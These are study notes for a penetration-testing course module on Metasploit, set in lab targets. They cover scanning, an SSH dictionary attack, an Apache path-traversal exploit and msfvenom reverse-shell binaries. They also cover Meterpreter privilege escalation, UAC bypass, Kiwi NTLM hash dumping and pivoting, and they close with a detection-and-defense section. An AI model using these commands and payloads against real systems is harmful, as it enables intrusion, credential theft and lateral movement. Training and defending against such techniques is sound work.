PEN-200 Module 14 — The Metasploit Framework (MSF setup, modules, payloads, Meterpreter, pivoting, resource scripts)

Fuente: material del curso correspondiente (sin video público)

Objective

Turn Metasploit from "a launcher for someone else's exploit" into the operating hub of a penetration test: initialize its PostgreSQL-backed database, use workspaces to keep assessments separate, drive enumeration through auxiliary modules, obtain access through exploit modules, choose the right payload (staged vs non-staged, raw shell vs Meterpreter), generate standalone binaries with msfvenom, run Windows post-exploitation (getsystem, migrate, UAC bypass, Kiwi/Mimikatz), pivot into internal networks, and automate listener setup with resource scripts.

Course flow (videos TMF_01_01–TMF_04_01): setup & database → auxiliary modules → exploit modules → payloads (staged/non-staged → Meterpreter → msfvenom executables) → Meterpreter post-exploitation (core features → post modules/Kiwi → pivoting) → resource scripts.

Target surface

  • Brute2 — Linux target used for SMB version scanning (SMB 2/3, prefers 3.1.1, signing not required) and the SSH dictionary-attack demo (SSH on port 2222, user george, password cracked from rockyou.txt). Later used for msfvenom delivery over RDP as user justin (password [REDACTED] — narrated, not printed).
  • Web18 — Linux web target running an Apache version vulnerable to CVE-2021-42013 (Apache 2.4.49 path traversal / RCE family), Apache on port 80, no HTTPS.
  • IT Workstation 1 — Windows client, initial foothold via a bind shell on port 4444; users louisa (SEImpersonate privilege, later NTLM-hashed by Kiwi) and offsec (local administrator, medium-integrity OneDrive process, pid 7120).
  • IT Workstation 2 — second Windows host on an internal network reachable only through Workstation 1; SMB (445) + RDP (3389) open; accessed with Louisa's credentials via PsExec and xfreerdp.
  • Transcript note: the ASR output contains no lab IP addresses and no literal credential values — the videos narrate over screen captures. Everything below is command-shape and methodology; lab IPs were not recoverable from audio.

Techniques

1. Setup: database, workspaces, db_nmap — TMF_01_01

Metasploit is preinstalled on Kali but its PostgreSQL database is neither running nor enabled. A database is optional but valuable: it stores discovered hosts, services, credentials, and vulnerabilities, and feeds module options later.

sudo msfdb init                    # start + initialize the MSF database
sudo systemctl enable postgresql   # persist across reboots
msfconsole -q                      # quiet: skip banner/version information
msf6> db_status                    # verify database connectivity

Console commands are grouped into categories: core, module, job, resource-script, database-backend, credentials-backend, and developer commands. Before any operations, isolate the assessment with workspaces (workspace lists, workspace <name> switches, workspace -a pen200 creates) so results from different engagements never mix in one database.

msf6> db_nmap <brute2-ip>          # nmap wrapper; identical syntax; findings stored in the DB
msf6> hosts                        # discovered hosts
msf6> services                     # discovered services
msf6> services -p 445              # filter by port → "which hosts run X"

db_nmap results become input to modules (technique 2). Module categories are visible on the splash summary or with show -h; modules use a slash-delimited hierarchical name and are activated with use.

2. Auxiliary modules — TMF_01_02

Auxiliary modules do everything that is not exploitation: enumeration, scanning, fuzzing, sniffing. List with show auxiliary; narrow with search type:auxiliary smb (search filters by app, type, CVE ID, platform, etc.). Activate by name or by search-index (use 56), then info / show options — the Required column tells which options must be set (set / unset).

Two worked examples:

  • SMB version scan (auxiliary/scanner/smb/smb_version) against Brute2: rather than typing RHOSTS manually, populate it straight from the database — services -p 445 -R feeds the stored results into RHOSTS. Output: target supports SMB 2 and 3, prefers 3.1.1. vulns then shows an automatically recorded vulnerability entry: "SMB signing is not required" — vulnerability bookkeeping without a dedicated scanner.
  • SSH dictionary attack (auxiliary/scanner/ssh/ssh_login), replicating the password-attacks module's Hydra run: set USERNAME george, PASS_FILE rockyou.txt, RHOSTS, and RPORT 2222. Difference vs Hydra: on success Metasploit automatically opens a session (interactive access) and stores the hit — creds lists it with the related host, service, and credential type.

3. Exploit modules — TMF_01_03

Over 2200 exploits, invoked like auxiliary modules. Scenario: Web18 runs an Apache vulnerable to CVE-2021-42013. Search for modules matching Apache 2.4.49 → two hits: an auxiliary checker (index 1) and the exploit (index 0).

Before running anything, read info:

  • side effects — IoCs, log entries, artifacts on disk (what defenders will see);
  • stability — whether the exploit may crash the target;
  • reliability — whether it can run more than once (repeatable session here);
  • available targets — OS/application/command-execution variants, usually including an Automatic Target;
  • check supported — whether check can dry-run the exploit to confirm the vulnerability first;
  • description — sanity-check that the module matches the CVE.

Exploit modules add a Payload Options section. Never accept the default payload blindly — set it explicitly to keep control of the exploitation process:

msf6> use 0
msf6 exploit(...)> set payload linux/x64/shell_reverse_tcp
msf6 exploit(...)> set lhost <kali-ip>     # double-check on multi-homed machines
msf6 exploit(...)> set lport 4444          # most modules default here
msf6 exploit(...)> set rport 80            # target Apache runs plain HTTP
msf6 exploit(...)> set ssl false
msf6 exploit(...)> set rhosts <web18-ip>
msf6 exploit(...)> run

Metasploit starts the matching listener itself — no manual Netcat needed. The module first verifies the target is vulnerable, then exploits and delivers the payload; a session opens. Sessions vs jobs:

  • Ctrl-Z backgrounds the active session; sessions -l lists (target + payload per session), sessions -i <id> re-enters, sessions -k <id> kills one, sessions -K kills all.
  • run -j launches the exploit as a background job: you keep working on the next target while Metasploit spawns and parks the session for you.

The course's framing: with many targets, the framework replaces "which terminal had which Netcat listener" with a session table plus a database of targets, results, and vulnerabilities that feeds the report.

4. Staged vs non-staged payloads — TMF_02_01

Buffer-overflow context: the shellcode must fit the buffer, so payload size matters.

  • Non-staged (shell_reverse_tcp): sent whole with the exploit — all-in-one, generally more stable, but bigger.
  • Staged (shell/reverse_tcp — the / marks the stage): two parts; a small primary payload makes the victim connect back, pull the larger secondary stage, and execute it. show payloads lists both variants; Metasploit reuses option values from the previously selected payload. The launched stage here was only 38 bytes — the right choice when exploit space is tight. (Receiver caveat appears in technique 6: Netcat cannot handle staged payloads.)

5. Meterpreter payload — TMF_02_02

A raw reverse shell is only a command shell. Meterpreter is a multifunction payload, dynamically extensible at runtime, entirely in memory on the target, encrypted by default, and built for Windows, Linux, macOS, Android, and more. Select the 64-bit non-staged meterpreter_reverse_tcp; options are the usual lhost/lport.

Inside the Meterpreter prompt (help groups commands: file system, networking, system, …):

meterpreter> sysinfo                # OS / architecture
meterpreter> getuid                 # current user
meterpreter> shell                  # drop to a native shell (runs in a channel)
# Ctrl-Z backgrounds the channel
meterpreter> channel -l             # list active channels
meterpreter> channel -i 1           # re-enter a channel
meterpreter> download /etc/passwd   # after lcd to the local download dir
meterpreter> upload unix-privesc-check /tmp

Commands prefixed with l (lcd, lpwd, …) operate on the local Kali machine — used to land downloads in ~/Downloads.

Switching the payload to x64 Meterpreter over reverse HTTPS (x64/meterpreter/reverse_https): communication is SSL/TLS-wrapped, so defenders see only HTTPS requests; the extra LURI option lets one listener on one port multiplex different payloads by URL path (blank → /). A defender browsing to the listener endpoint gets a plain 404 Not Found. Caveat the course stresses: Meterpreter is the best-known framework payload, so antivirus detection rates are high — the recommended pattern is a raw TCP shell for the initial foothold, then deploy Meterpreter once security tech is identified/bypassed (obfuscation is out of scope here).

6. Executable payloads with msfvenom — TMF_02_03

msfvenom exports payloads as Windows/Linux binaries, web shells, and more.

msfvenom -l payloads                      # list; --platform + --arch to narrow
msfvenom -p windows/x64/shell_reverse_tcp lhost=<kali-ip> lport=443 \
         -f exe -o shell.exe              # non-staged first

Delivery demo against Brute2: Netcat listener on 443, Python web server on 80, RDP as justin (password [REDACTED]), PowerShell download + execute → reverse shell lands on the Netcat listener. Repeating with the staged windows/x64/shell/reverse_tcp: the connection arrives but Netcat cannot speak the stage protocol — no interactive shell. The fix is Metasploit's multi/handler, which handles staged, non-staged, and advanced (Meterpreter) payloads:

msf6> use multi/handler
msf6> set payload windows/x64/shell/reverse_tcp
msf6> set lhost <kali-ip>
msf6> set lport 443
msf6> run          # blocks the prompt; use `run -j` to background
msf6> jobs         # list active listeners waiting for connections

Rule: staged or Meterpreter payloads require multi/handler, not Netcat. Three uses of generated files: transfer-and-execute binaries (PowerShell/EXE/ELF), web shells against web-application vulns, and client-side attack attachments.

7. Core Meterpreter post-exploitation — TMF_03_01

The Linux Meterpreter has fewer features than the Windows one, so the demos run on IT Workstation 1 via a bind shell on 4444 and a delivered met.exe (msfvenom non-staged Windows Meterpreter binary) received by multi/handler.

  • idle_time — one of the first commands after sysinfo/getuid: how long the user has been idle (here ~10 minutes). If the user is away, it is safe to briefly pop console windows (cmd/PowerShell) during execution.
  • getsystem — automatic elevation to NT AUTHORITY\SYSTEM via named-pipe impersonation and token duplication, leveraging SeImpersonate / SeDebug privileges (pre-check in a shell: confirm the current user — louisa — holds one). Succeeded here through named-pipe impersonation, mirroring the manual technique from the Windows Privilege Escalation module.
  • migrate — the payload lives in the process that launched it; if that dies, access dies. ps shows met.exe (pid 1236) standing out in the process list; migrating into the user's OneDrive process (pid 7120) blends in. Constraint: can only migrate into processes at the same or lower integrity/privilege level — trivial as SYSTEM. After migrating, ps output changes context (now running as offsec) and the original process is gone.
  • execute -h -f notepad — when no suitable process exists, spawn a hidden process and migrate into it.

8. Post-exploitation modules: UAC bypass and Kiwi — TMF_03_02

Client-side footholds are usually unprivileged; if the user is a local administrator, a UAC bypass yields a high-integrity process.

  1. Re-establish: bind shell → met.exe → getsystem → migrate into onedrive.exe (running as offsec, an administrator, but constrained to medium integrity by UAC).
  2. Confirm integrity with third-party tooling: PowerShell module NtObjectManager, Import-Module then Get-NtTokenIntegrityLevel → Medium. (Process Explorer is an alternative.)
  3. Background the session and search UAC-bypass modules; pick exploit/windows/local/bypass_uac_sdclt (abuses the Microsoft binary sdclt.exe to spawn a high-integrity process). Set SESSION and lhost, run → a new Meterpreter session whose token checks out High.

Alternative to backgrounding: load capabilities inside the session with the load command. Kiwi is the in-session Mimikatz extension and requires SYSTEM: restart the flow as louisa, getsystem, load kiwi, help to list commands, then:

meterpreter> creds_msv     # dump LM/NTLM credentials

→ NTLM hash of louisa retrieved. (Post modules take a SESSION option so they execute directly against the active session.)

9. Pivoting with Metasploit — TMF_03_03

Foothold on IT Workstation 1; Meterpreter reveals a second network interface with an internal IP. Build a path to the internal network:

meterpreter> background
msf6> route add <internal-cidr> <session-id>   # route via the compromised host
msf6> route print

Enumerate through the route — a portscan auxiliary module would sweep the subnet, but here the single other host is scanned for 445 and 3389 (both open). Then pivot exploitation:

  • PsExec (exploit/windows/smb/psexec) as louisa: set SMBUser louisa, SMBPass (cracked from the Kiwi NTLM hash), RHOSTS. Key routing insight: a route only carries established connections, so the payload on the internal target must be a bind shell (meterpreter/bind_tcp) — a reverse shell has no route back to the attacker's network.
  • AutoRoute (post/multi/manage/autoroute) automates routes through an existing Meterpreter session: route flush first, set SESSION, run → routing table populated.

Combine the route with a SOCKS proxy so non-Metasploit tools tunnel through:

msf6> use auxiliary/server/socks_proxy
msf6> set srvhost localhost
msf6> set version 5          # SOCKSv5; tunneled on port 1080 by default
msf6> run
# point proxychains.conf at the SOCKS proxy, then:
proxychains xfreerdp <workstation2-ip>

→ GUI RDP session on IT Workstation 2 from Kali, through the pivot. Alternative: port forwarding from inside the session — portfwd add -l 3389 -p 3389 (local 3389 → target 3389), then xfreerdp localhost. Chained pivots work the same way if the next host touches yet another network.

10. Resource scripts — TMF_04_01

Resource scripts chain console commands plus Ruby (Metasploit's own language) for control flow — the automation layer for repetitive setup. Example ~/listener.rc: a recurring multi/handler for a non-staged Windows x64 Meterpreter over HTTPS:

use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost <kali-ip>
set lport 443
set AutoRunScript post/windows/manage/migrate   # auto-migrate into a hidden notepad
set ExitOnSession false                          # keep accepting further connections
run -z -j                                        # job, don't auto-interact

Launch with msfconsole -r ~/listener.rc. Delivered to Brute2 via RDP (justin, password [REDACTED]) as before → on connect, Metasploit automatically migrates into the spawned notepad process, protecting the session from premature death (defensive tooling or process termination).

Built-in scripts ship under Metasploit's scripts/resource directory (port scanning, brute forcing, protocol enumeration); review and adapt before use. Note some rely on the global datastore: set/unset scope options to the current module, while setg/unsetg define values across all modules. Recommended practice: build a personal library of resource scripts (listeners, pivoting, post-exploitation) and tweak per engagement.

Detection & defense

  • Database and workspaces are an attacker's memory: db_nmap, hosts, services, creds, vulns mean one compromise of a tester's box exposes the whole assessment trail — encrypt/protect operator workstations, and note that defenders face the framework, not a single exploit: sessions persist, so killing the payload process is not enough if a listener + AutoRunScript re-establishes access.
  • info side effects are the defender's script: this module family leaves artifacts on disk (met.exe), log entries, and IoCs. EDR rules on msfvenom-generated binaries and unusual exe drops from user-writable dirs (temp, downloads) catch the delivery chain used throughout (web-server download → execute).
  • Meterpreter in memory defeats file-based AV by design, but process behavior remains: a payload that pops a console while the user is active is the exact reason idle_time exists — alert on short-lived console windows spawning from user applications. Meterpreter over HTTPS blends into TLS traffic and 404s on inspection of the listener, so rely on TLS inspection/JA3-style fingerprinting rather than URL filtering, and remember detection rates for stock Meterpreter are high in AV.
  • getsystem / migrate / UAC bypass are the classic triad: named-pipe impersonation relies on SeImpersonate — restricted service accounts blunt it; cross-process migration into user applications (OneDrive, notepad) is exactly the LOLBin-style behavior behavioral detection should flag; UAC-bypass modules abuse auto-elevating Microsoft binaries (sdclt.exe) — monitor for those binaries spawning unexpected children, and keep UAC at "always notify."
  • Kiwi/creds_msv pulls NTLM hashes from LSASS memory — requires SYSTEM; LSASS protection (Credential Guard / RunAsPPL) defeats the dump. Any captured NTLM hash is reusable (pass-the-hash / PsExec with cracked credentials), so rotate exposed credentials even after containment.
  • Pivoting: internal targets (SMB 445, RDP 3389) were reachable purely because the client workstation was dual-homed. Segment so client VLANs cannot reach internal server networks, require SMB signing (the aux module surfaced "signing not required" on Brute2), and treat a compromised client's established connections as the tunnel — the course's bind-shell requirement shows why egress filtering plus deny-by-default between zones breaks reverse paths, while lateral bind shells are broken only by host firewalls.
  • Resource scripts with AutoRunScript/migrate automate persistence-adjacent behavior; defenders should expect automated, fast process-hopping, not manual operator actions.
  • Cross-cutting, in the course's own terms: Metasploit records everything for the report — the honest flip side is that every session, credential, and route added is also evidence; defenders who preserve memory and logs can reconstruct the attacker's workspace.
